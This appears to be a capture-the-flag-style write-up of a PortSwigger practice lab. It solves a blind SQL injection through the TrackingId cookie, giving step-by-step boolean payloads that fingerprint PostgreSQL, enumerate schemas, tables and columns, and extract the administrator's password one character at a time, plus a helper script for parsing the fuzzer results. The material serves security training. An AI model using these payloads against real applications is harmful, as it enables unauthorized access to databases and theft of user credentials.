# Blind SQL injection with conditional responses

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

To solve the lab, log in as the administrator user.

---

## Lab

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

---

## OWASP Category

A03:2021 – Injection

---

## Steps to Solve

---

**Step 1 — Searching the SQLi Type**

We can't inject payload directly without knowing the actual type of SQLi. So we need to know which type of SQLi we can perform here.

First we try to find a parameter we can inject a query into. After some [**Information Gathering**](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/README) we found that the application stores cookies and its **TrackingId** is where we can inject our payload.

<img width="333" height="37" alt="image" src="https://github.com/user-attachments/assets/955276a0-a88c-4d6c-b4e9-68e8b31089de" />

Then we try a UNION-based query but there is no error or change seen in the application. You can refer to previous [**labs**](https://github.com/s1v7m81/Portswigger-Writeups_WebSec/tree/main/Portswigger_Web-Sec/SQL-Injection) for that.

We confirmed that this is a **Blind SQLi** type because the web application does not show any response to the payload on the web page.

After that we inject a query with the cookie parameter and see that this is **Conditional-Based Blind SQLi**:

```http
abc' AND '1'='1
abc' AND '1'='2
```

Here **abc** is the assumed value of **TrackingId** in the request. We observe that if the condition is true then the **Welcome back!** message appears on the web page, and if the condition is false then it disappears.

For all this we use [**OWASP ZAP**](https://www.zaproxy.org/download/). For usage of OWASP ZAP you can refer to this [**Guide**](https://www.zaproxy.org/docs/).

Like this:

<img width="440" height="78" alt="image" src="https://github.com/user-attachments/assets/d3520de0-1958-44a5-b318-92f6a2881171" />

Now let's inject some queries related to blind SQLi to retrieve data.

---

**Step 2 — Inject Payload**

First we check which database the web app is using. We can check this with the following queries:

PostgreSQL / Oracle:
```http
abc' AND 'a'||'a'='aa'--
```

MySQL:
```http
abc' AND CONCAT('a','a')='aa'--
```

MSSQL:
```http
abc' AND 'a'+'a'='aa'--
```

We found the **Welcome Back!** message with the query `' AND 'a'||'a'='aa'--`. So there is a possibility of **PostgreSQL** or **Oracle**. This is confirmed automatically after the table name is found, because in **Oracle** a table named **dual** exists by default as a dummy table.

Now we try to discover the number of columns in the database with queries like:

```http
' ORDER BY 1--
' ORDER BY 2--
```

After the `' ORDER BY 1--` query we do not get the Welcome back! message. So we confirmed that the database has **one column only**.

We check all the above queries to see if the response gives the Welcome back! message or not. Because in **Conditional Blind SQLi** we discover information by checking whether a condition is true or not — if the condition is true we assume the query is correct and use that to extract information about the database.

---

**Step 3 — Retrieve Data**

For retrieving data from the database we know that the table has only one column. So we inject some interesting queries with the cookie parameter. First we check the **metadata about the DATABASE** with PostgreSQL queries.

---

**1. SCHEMATA**

We use the following query to check each letter in `schema_name`. `LIMIT 1` gives only 1 row and `OFFSET 0` skips 0 rows before that row. We set the position number and the character to guess as payload parameters. You can refer to the PostgreSQL documentation to understand this query in depth.

Query for OFFSET 0:
```http
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 0),1,1)='a'--
```

We use the **Fuzzer** for iteration. We set different payload parameters in the fuzzer — the position number uses `Numberzz` type with range 1 to 20, and the character guess uses a file containing all lowercase alphabets and special characters like `_`, `-`, `@`.

<img width="1096" height="491" alt="image" src="https://github.com/user-attachments/assets/ba620af2-3c0b-4b16-b68e-4ecabc5be617" />

Let's FUZZ!

After fuzzing we find responses with a different byte size. We check that the **Welcome back!** message appears in those responses and sort by size.

Schema found: **pg_catalog** for OFFSET 0 — confirming **PostgreSQL DB**. You can see the payload section in the snapshot below.

<img width="1909" height="375" alt="image" src="https://github.com/user-attachments/assets/161b3921-1319-4667-9e79-f33b06ced604" />

Now let's change the OFFSET to 1 to find the next schema:

```http
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 1),1,1)='a'--
```

Schema found: **public** for OFFSET 1

<img width="1908" height="372" alt="image" src="https://github.com/user-attachments/assets/ba5cdcc4-b150-48aa-af33-6b2caa13072b" />

Now let's change the OFFSET to 2 to find the next schema:

```http
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 2),1,1)='a'--
```

Schema found: **information_schema** for OFFSET 2

<img width="1901" height="580" alt="image" src="https://github.com/user-attachments/assets/80056d5a-8e55-482c-a819-cbc69d5a5972" />

We likely have an interesting schema named **public**. Let's try to discover the table names inside it.

---

**2. TABLES**

We use the following query to retrieve table names from the **public** schema.

Query for OFFSET 0:
```http
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='a'--
```

Let's fuzz this!

Table found: **users** for OFFSET 0. You can find the string in the payload section in the snapshot below.

<img width="1915" height="323" alt="image" src="https://github.com/user-attachments/assets/60fade4b-87c9-4fb5-841c-9baffdb7ea23" />

Now let's change the OFFSET to 1 to find the next table:

```http
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1),1,1)='a'--
```

Table found: **tracking** for OFFSET 1

<img width="1920" height="319" alt="image" src="https://github.com/user-attachments/assets/0fa867f8-a38a-4921-a0a8-89474563147e" />

After that with OFFSET 2 we found nothing. We have one table named **users** which is likely sensitive.

---

**3. COLUMNS**

We use the following query to retrieve column names from the **users** table.

Query for OFFSET 0:
```http
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0),1,1)='a'--
```

Column name found: **username** for OFFSET 0

<img width="1918" height="318" alt="image" src="https://github.com/user-attachments/assets/7f9ee8cc-eb32-4118-89d0-c2e61f416b66" />

Now let's change the OFFSET to 1 to find the next column:

```http
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1),1,1)='a'--
```

Column name found: **password** for OFFSET 1

<img width="1907" height="339" alt="image" src="https://github.com/user-attachments/assets/b759fd58-f0d9-42ec-851d-996bba79a4da" />

Now let's change the OFFSET to 2 to find the next column:

```http
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 2),1,1)='a'--
```

Column name found: **email** for OFFSET 2

<img width="1917" height="350" alt="image" src="https://github.com/user-attachments/assets/3ab7d02d-34a3-4687-a561-f4b7493f91db" />

We found two sensitive columns — **username** and **password**.

---

**4. Final Data Extraction**

Now we extract the actual data from the **users** table.

Query for username with OFFSET 0:
```http
' AND SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET 0),1,1)='a'--
```

Username found: **administrator** — our targeted user.

<img width="1877" height="425" alt="image" src="https://github.com/user-attachments/assets/fa1ff52a-241d-4ac2-b412-7e8d66324d84" />

Now we extract the password of **administrator** using the same OFFSET but targeting the password column:

```http
' AND SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0),1,1)='a'--
```

Final password found: **7yfwzo7cru49myc21g8v**

<img width="1917" height="532" alt="image" src="https://github.com/user-attachments/assets/7639d013-8864-4342-9bed-d0e1714391de" />

---

**Lab Solved**

<img width="1644" height="804" alt="image" src="https://github.com/user-attachments/assets/2e7ddcee-6d1e-45fe-9af0-78300d47ce94" />

---

## Bonus Code

We can use a **Python script** to retrieve the password from the `.csv` file exported from the ZAP Fuzzer.

```python
import csv

sizes = set()
with open('Untitled.csv', 'r') as f:
    for row in csv.DictReader(f):
        sizes.add(row['Size Resp. Body'])
print("Sizes found:", sorted(sizes))

correct_size = input("Enter correct size: ").strip()
results = {}

with open('Untitled.csv', 'r') as f:
    for row in csv.DictReader(f):
        if row['Size Resp. Body'] == correct_size:
            p = row['Payloads'].strip('[]"').split(', ')
            results[int(p[0])] = p[1].strip('"')

print("Found:", ''.join(results[k] for k in sorted(results)))
```

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
